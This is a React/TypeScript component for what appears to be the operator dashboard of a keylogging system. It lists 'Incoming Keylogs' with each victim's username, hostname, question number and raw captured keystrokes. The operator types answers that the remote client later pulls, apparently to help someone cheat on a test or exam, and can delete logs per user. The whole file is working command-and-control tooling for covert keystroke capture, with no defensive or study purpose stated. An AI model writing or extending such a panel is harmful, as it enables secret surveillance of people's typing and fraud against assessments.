import React, { useState, useEffect } from 'react';
import axios from 'axios';
import API_URL from '../config';
import { Send, Clock, MessageSquare, Loader2, Trash2, MessageCircle, AlertCircle, CheckCircle2 } from 'lucide-react';



interface Keylog {
  id: string;
  deviceInfo: {
    username: string;
    hostname: string;
  };
  questionNumber: string;
  loggedKeys: string;
  lastTimestamp: string;
}

interface KeylogResponse {
  id: string;
  questionNumber: string;
  response: string;
  submittedAt: string;
  keylogId: string;
  firstPulledAt?: string;
  lastPulledAt?: string;
}

const TextMode: React.FC = () => {
  const [logs, setLogs] = useState<Keylog[]>([]);
  const [loading, setLoading] = useState(true);
  const [page, setPage] = useState(1);
  const [hasMore, setHasMore] = useState(true);
  const [loadingMore, setLoadingMore] = useState(false);
  const [selectedLog, setSelectedLog] = useState<Keylog | null>(null);
  const [responses, setResponses] = useState<KeylogResponse[]>([]);
  const [response, setResponse] = useState('');
  const [sending, setSending] = useState(false);
  const [status, setStatus] = useState<'idle' | 'success' | 'error'>('idle');
  const [confirmDelete, setConfirmDelete] = useState<{ type: 'single' | 'all', id?: string, user?: string } | null>(null);

  useEffect(() => {
    fetchLogs(1, true);
  }, []);

  useEffect(() => {
    if (selectedLog) {
      fetchResponses(selectedLog.id);
      setStatus('idle');
    } else {
      setResponses([]);
    }
  }, [selectedLog]);

  const fetchLogs = async (pageNum: number, isInitial: boolean = false) => {
    if (isInitial) setLoading(true);
    else setLoadingMore(true);
    
    try {
      const res = await axios.get(`${API_URL}/api/text/logs?page=${pageNum}&limit=6`, {
        headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
      });
      const newLogs = res.data || [];
      if (isInitial) {
        setLogs(newLogs);
      } else {
        setLogs(prev => [...prev, ...newLogs]);
      }
      setHasMore(newLogs.length === 6);
      setPage(pageNum);
    } catch (err) {
      console.error('Failed to fetch logs', err);
    } finally {
      setLoading(false);
      setLoadingMore(false);
    }
  };

  const fetchResponses = async (keylogId: string) => {
    try {
      const res = await axios.get(`${API_URL}/api/text/responses/id/${keylogId}`, {
        headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
      });
      setResponses(res.data || []);
    } catch (err) {
      console.error('Failed to fetch responses', err);
    }
  };

  const handleSendResponse = async () => {
    if (!selectedLog || !response.trim()) return;
    setSending(true);
    setStatus('idle');
    try {
      await axios.post(`${API_URL}/api/text/responses`, {
        questionNumber: selectedLog.questionNumber,
        response: response,
        keylogId: selectedLog.id
      }, {
        headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
      });
      setResponse('');
      fetchResponses(selectedLog.id);
      setStatus('success');
      setTimeout(() => setStatus('idle'), 3000);
    } catch (err) {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    } finally {
      setSending(false);
    }
  };

  const executeDelete = async () => {
    if (!confirmDelete) return;
    try {
      if (confirmDelete.type === 'single' && confirmDelete.id) {
        await axios.delete(`${API_URL}/api/text/logs/${confirmDelete.id}`, {
          headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
        });
        setLogs(logs.filter(l => l.id !== confirmDelete.id));
        if (selectedLog?.id === confirmDelete.id) setSelectedLog(null);
      } else if (confirmDelete.type === 'all' && confirmDelete.user) {
        // Implement backend "Clear All for User" or loop here
        // For now, let's filter logs by user locally for immediate UI feedback
        const userLogs = logs.filter(l => l.deviceInfo.username === confirmDelete.user);
        for (const log of userLogs) {
          await axios.delete(`${API_URL}/api/text/logs/${log.id}`, {
            headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
          });
        }
        setLogs(logs.filter(l => l.deviceInfo.username !== confirmDelete.user));
        if (selectedLog?.deviceInfo.username === confirmDelete.user) setSelectedLog(null);
      }
      setConfirmDelete(null);
    } catch (err) {
      alert('Delete failed');
    }
  };

  const handleDeleteResponse = async (id: string) => {
    try {
      await axios.delete(`${API_URL}/api/text/responses/${id}`, {
        headers: { Authorization: `Bearer ${localStorage.getItem('token')}` }
      });
      setResponses(responses.filter(r => r.id !== id));
    } catch (err) {
      console.error('Failed to delete response');
    }
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <Loader2 className="w-8 h-8 text-indigo-500 animate-spin" />
      </div>
    );
  }

  // Calculate First and Last timestamps for the selected log's user/question
  const userLogs = selectedLog ? logs.filter(l => l.deviceInfo.username === selectedLog.deviceInfo.username && l.questionNumber === selectedLog.questionNumber) : [];
  const firstTime = userLogs.length > 0 ? new Date(Math.min(...userLogs.map(l => new Date(l.lastTimestamp).getTime()))).toLocaleString() : 'N/A';
  const lastTime = userLogs.length > 0 ? new Date(Math.max(...userLogs.map(l => new Date(l.lastTimestamp).getTime()))).toLocaleString() : 'N/A';

  const lineCount = selectedLog ? selectedLog.loggedKeys.split('\n').length : 0;

  return (
    <div className="flex flex-col lg:grid lg:grid-cols-3 gap-6 lg:gap-8 h-auto lg:h-full relative">
      {/* Sidebar: Log List */}
      <div className="flex-none lg:col-span-1 flex flex-col space-y-4 h-auto lg:h-full min-h-0 min-w-0 w-full">
        <div className="flex justify-between items-center px-2">
          <h2 className="text-lg font-semibold text-white flex items-center gap-2">
            <MessageSquare className="w-5 h-5 text-indigo-400" />
            Incoming Keylogs
          </h2>
          {selectedLog && (
            <button 
              onClick={() => setConfirmDelete({ type: 'all', user: selectedLog.deviceInfo.username })}
              className="text-[10px] text-red-400 hover:text-red-300 font-bold border border-red-900/50 px-2 py-1 rounded bg-red-500/10 transition-all"
            >
              Clear All for {selectedLog.deviceInfo.username}
            </button>
          )}
        </div>
        <div className="lg:flex-1 flex flex-col min-h-0 min-w-0 w-full">
          <div className="w-full flex flex-row lg:grid lg:grid-cols-2 overflow-x-auto overflow-y-hidden lg:overflow-x-hidden lg:overflow-y-auto pr-2 custom-scrollbar gap-4 pb-4 lg:content-start snap-x">
            {logs.map((log) => (
              <div key={log.id} className="w-[280px] lg:w-full shrink-0 snap-start flex">
                <div
                  onClick={() => setSelectedLog(log)}
                  className={`flex flex-col justify-between p-4 rounded-xl cursor-pointer transition-all border group w-full h-[140px] lg:h-auto ${
                selectedLog?.id === log.id
                  ? 'bg-indigo-600/20 border-indigo-500 shadow-lg shadow-indigo-500/10'
                  : 'bg-slate-800/50 border-slate-700 hover:border-slate-600 hover:bg-slate-800'
              }`}
            >
              <div className="flex justify-between items-start mb-2">
                <div className="flex items-center gap-2">
                  <div className="w-8 h-8 rounded-full bg-slate-700 flex items-center justify-center text-xs font-bold text-indigo-400">
                    {log.deviceInfo.username.substring(0, 2).toUpperCase()}
                  </div>
                  <div>
                    <p className="text-sm font-bold text-white leading-none">{log.deviceInfo.username}</p>
                    <p className="text-[10px] text-slate-500">{log.deviceInfo.hostname}</p>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-[10px] bg-slate-900 px-2 py-0.5 rounded text-slate-400 font-mono">
                    Q: {log.questionNumber}
                  </span>
                  <button 
                    onClick={(e) => { e.stopPropagation(); setConfirmDelete({ type: 'single', id: log.id }); }}
                    className="opacity-0 group-hover:opacity-100 p-1.5 hover:bg-red-500/20 text-red-400 rounded-lg transition-all"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                  </button>
                </div>
              </div>
              <p className="text-xs text-slate-400 line-clamp-2 font-mono italic">
                "{log.loggedKeys}"
              </p>
              <div className="mt-3 flex items-center gap-1.5 text-[10px] text-slate-500">
                <Clock className="w-3 h-3" />
                {new Date(log.lastTimestamp).toLocaleString()}
              </div>
            </div>
              </div>
            ))}

            {hasMore && (
              <div className="w-[280px] lg:w-full shrink-0 snap-start lg:col-span-2 flex">
                <button
                  onClick={() => fetchLogs(page + 1)}
                  disabled={loadingMore}
                  className="w-full h-[140px] lg:h-auto py-3 text-sm font-medium text-slate-400 bg-slate-800/20 border border-slate-700/50 rounded-xl hover:bg-slate-800/40 hover:text-white transition-all disabled:opacity-50 flex items-center justify-center"
                >
                  {loadingMore ? 'Loading...' : 'Load More Logs'}
                </button>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Main Area: Content & Response */}
      <div className="lg:col-span-2 space-y-6 flex flex-col h-auto lg:h-full">
        {selectedLog ? (
          <div className="bg-slate-800/30 border border-slate-700 rounded-2xl p-6 flex-1 flex flex-col min-h-0 overflow-hidden">
            <div className="flex flex-col md:flex-row justify-between items-start md:items-center mb-6 pb-6 border-b border-slate-700 gap-4">
              <div>
                <h3 className="text-xl font-bold text-white flex items-center gap-2 flex-wrap">
                  Question Number: <span className="text-indigo-400">{selectedLog.questionNumber}</span>
                  {status === 'success' && <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse ml-2" title="Sent successfully" />}
                  {status === 'error' && <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse ml-2" title="Failed to send" />}
                </h3>
                <div className="flex flex-wrap gap-2 md:gap-4 mt-2">
                   <p className="text-[10px] text-slate-500">First: <span className="text-slate-300">{firstTime}</span></p>
                   <p className="text-[10px] text-slate-500">Last: <span className="text-slate-300">{lastTime}</span></p>
                </div>
              </div>
              <div className="md:text-right">
                <p className="text-xs text-slate-500">From User</p>
                <p className="text-sm text-slate-300 font-bold">{selectedLog.deviceInfo.username}</p>
              </div>
            </div>

            <div className="flex-1 grid grid-cols-1 md:grid-cols-2 gap-8 min-h-0 mb-6">
              {/* Left: Content */}
              <div className="flex flex-col min-h-0">
                <div className="flex justify-between items-center mb-2">
                  <label className="block text-sm font-medium text-slate-300">Logged Content (Raw)</label>
                  {selectedLog && (
                    <span className="text-[10px] text-indigo-400 font-mono bg-indigo-500/10 px-2 py-0.5 rounded border border-indigo-500/20">
                      Lines: {lineCount}
                    </span>
                  )}
                </div>
                <div className="h-[250px] bg-slate-950/50 border border-slate-800 p-6 rounded-xl font-mono text-indigo-300 whitespace-pre-wrap overflow-y-auto custom-scrollbar no-scrollbar shadow-inner leading-relaxed text-sm">
                  {selectedLog.loggedKeys}
                </div>
              </div>

              {/* Right: History */}
              <div className="flex flex-col min-h-0">
                <label className="block text-sm font-medium text-slate-300 mb-2">Response History (Pre-text)</label>
                <div className="h-[250px] bg-slate-900/50 border border-slate-800 rounded-xl overflow-y-auto custom-scrollbar no-scrollbar p-4 space-y-4">
                  {responses.length > 0 ? (
                    responses.map((res) => (
                      <div key={res.id} className="bg-slate-800/50 border border-slate-700 p-3 rounded-lg group">
                        <div className="flex justify-between items-start mb-1">
                          <div className="text-[10px] text-slate-500 font-mono">
                            <div>Submitted: {new Date(res.submittedAt).toLocaleString()}</div>
                            {res.firstPulledAt && <div style={{ color: '#10b981' }}>First Pulled: {new Date(res.firstPulledAt).toLocaleString()}</div>}
                            {res.lastPulledAt && <div style={{ color: '#3b82f6' }}>Last Pulled: {new Date(res.lastPulledAt).toLocaleString()}</div>}
                          </div>
                          <button 
                            onClick={() => handleDeleteResponse(res.id)}
                            className="opacity-0 group-hover:opacity-100 p-1 hover:bg-red-500/20 text-red-400 rounded transition-all"
                          >
                            <Trash2 className="w-3 h-3" />
                          </button>
                        </div>
                        <p className="text-sm text-indigo-300 font-mono whitespace-pre-wrap bg-slate-950/30 p-2 rounded mt-1 border border-indigo-500/20">{res.response}</p>
                      </div>
                    ))
                  ) : (
                    <div className="h-full flex flex-col items-center justify-center text-slate-600 opacity-50">
                      <MessageCircle className="w-8 h-8 mb-2" />
                      <p className="text-xs">No responses yet</p>
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className="space-y-4">
              <div className="flex justify-between items-end">
                <label className="block text-sm font-medium text-slate-300">Your Response</label>
                {status !== 'idle' && (
                  <p className={`text-[10px] flex items-center gap-1 font-bold ${status === 'success' ? 'text-green-400' : 'text-red-400'}`}>
                    {status === 'success' ? <CheckCircle2 className="w-3 h-3" /> : <AlertCircle className="w-3 h-3" />}
                    {status === 'success' ? 'SENT' : 'FAILED'}
                  </p>
                )}
              </div>
              <div className="relative group">
                <textarea
                  value={response}
                  onChange={(e) => setResponse(e.target.value)}
                  placeholder="Type instructions or answers..."
                  className="w-full h-24 bg-slate-900 border border-slate-700 rounded-xl p-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent transition-all resize-none shadow-xl font-mono text-sm"
                />
                <button
                  onClick={handleSendResponse}
                  disabled={sending || !response.trim()}
                  className="absolute bottom-3 right-3 flex items-center gap-2 px-6 py-1.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg font-semibold transition-all shadow-lg shadow-indigo-600/30 disabled:opacity-50 disabled:cursor-not-allowed active:scale-95 text-xs"
                >
                  {sending ? <Loader2 className="w-3 h-3 animate-spin" /> : <Send className="w-3 h-3" />}
                  Submit
                </button>
              </div>
            </div>
          </div>
        ) : (
          <div className="flex-1 flex flex-col items-center justify-center bg-slate-800/20 border border-dashed border-slate-700 rounded-2xl p-12 text-center">
            <div className="w-16 h-16 bg-slate-800 rounded-full flex items-center justify-center mb-4">
              <MessageSquare className="w-8 h-8 text-slate-600" />
            </div>
            <h3 className="text-lg font-medium text-slate-300">No Log Selected</h3>
            <p className="text-slate-500 max-w-xs mt-2">Select a keylog from the sidebar to view its content and send a response.</p>
          </div>
        )}
      </div>

      {/* Custom Confirmation Modal (Non-browser) */}
      {confirmDelete && (
        <div className="absolute inset-0 z-50 flex items-center justify-center bg-slate-950/80 backdrop-blur-sm rounded-2xl p-8">
          <div className="bg-slate-900 border border-slate-700 p-6 rounded-2xl shadow-2xl max-w-sm w-full text-center animate-shake">
            <AlertCircle className="w-12 h-12 text-red-500 mx-auto mb-4" />
            <h4 className="text-lg font-bold text-white mb-2">Are you sure?</h4>
            <p className="text-sm text-slate-400 mb-6">
              {confirmDelete.type === 'all' 
                ? `This will permanently delete ALL questions and responses for user "${confirmDelete.user}". This action cannot be undone.` 
                : "This will delete this specific entry permanently."}
            </p>
            <div className="flex gap-3">
              <button 
                onClick={() => setConfirmDelete(null)}
                className="flex-1 px-4 py-2 bg-slate-800 hover:bg-slate-700 text-white rounded-lg transition-all"
              >
                Cancel
              </button>
              <button 
                onClick={executeDelete}
                className="flex-1 px-4 py-2 bg-red-600 hover:bg-red-500 text-white rounded-lg font-bold transition-all shadow-lg shadow-red-600/20"
              >
                Confirm Delete
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default TextMode;
